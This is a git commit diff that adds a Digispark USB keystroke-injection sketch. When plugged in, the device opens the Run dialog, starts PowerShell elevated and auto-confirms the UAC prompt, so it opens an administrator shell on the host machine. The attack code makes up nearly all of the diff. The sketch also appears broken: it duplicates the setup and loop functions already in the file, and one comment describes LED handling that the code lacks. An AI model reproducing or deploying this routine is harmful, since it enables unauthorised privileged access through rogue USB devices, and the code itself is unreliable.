00f0dba7de1dc01cb4b9075be62ae44839628aa7
Xre0uS <hello@xre0us.io>
2025-03-23 17:15:28 +0800

    Update admin_shell.cpp

--- admin_shell.cpp
+++ admin_shell.cpp
@@ -18,3 +18,29 @@ void setup()
 void loop()
 {
 }
+
+
+
+
+
+//just opening admin powershell (not hidden) 
+#include "DigiKeyboard.h"
+
+void setup()
+{//turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("powershell"); 
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  
+  
+  
+ 
+}
+void loop()
+{
+}
